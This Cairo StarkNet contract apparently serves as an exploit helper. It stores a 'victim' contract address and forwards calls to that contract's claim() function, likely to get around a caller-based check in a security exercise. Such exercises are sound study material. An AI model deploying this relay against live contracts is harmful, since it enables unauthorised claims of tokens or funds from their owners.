%lang starknet


@contract_interface
namespace VictimContract {
    func claim() {
    }
}

from starkware.cairo.common.cairo_builtins import HashBuiltin
from starkware.starknet.common.syscalls import get_caller_address

@storage_var
func victim_contract() -> (res: felt) {
}

@constructor
func constructor{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(victim: felt) {
    victim_contract.write(victim);
    return ();
}

@external
func claim{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}() {
    let (victim_address) = victim_contract.read();
    VictimContract.claim(contract_address=victim_address);
    return ();
}
